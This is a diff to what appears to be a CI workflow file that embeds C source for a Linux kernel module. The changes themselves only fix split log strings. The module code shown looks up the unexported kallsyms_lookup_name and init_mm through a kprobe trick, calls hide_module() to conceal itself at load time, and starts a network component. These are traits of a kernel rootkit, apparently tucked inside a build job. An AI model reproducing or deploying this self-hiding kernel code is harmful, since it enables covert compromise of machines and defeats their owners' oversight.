@@ -55,14 +55,12 @@ jobs:
               unsigned long addr;
               int ret = register_kprobe(&kp);
               if (ret < 0) {
-                  pr_err("kprobe register failed for %s: %d
-", name, ret);
+                  pr_err("kprobe register failed for %s: %d", name, ret);
                   return 0;
               }
               addr = (unsigned long)kp.addr;
               unregister_kprobe(&kp);
-              pr_info("Found %s at %px
-", name, (void *)addr);
+              pr_info("Found %s at %px", name, (void *)addr);
               return addr;
           }
 
@@ -169,23 +167,19 @@ jobs:
           }
 
           static int __init rw_init(void) {
-              pr_info("Loading module...
-");
+              pr_info("Loading module...");
               _kallsyms_lookup_name = (void *)kprobe_lookup_name("kallsyms_lookup_name");
               init_mm_ptr = (void *)kprobe_lookup_name("init_mm");
               if (!init_mm_ptr) {
-                  pr_err("Failed to find init_mm
-");
+                  pr_err("Failed to find init_mm");
                   return -ENODEV;
               }
               hide_module();
               if (net_init() < 0) {
-                  pr_err("Net init failed
-");
+                  pr_err("Net init failed");
                   return -ENODEV;
               }
-              pr_info("Module loaded OK
-");
+              pr_info("Module loaded OK");
               return 0;
           }
 
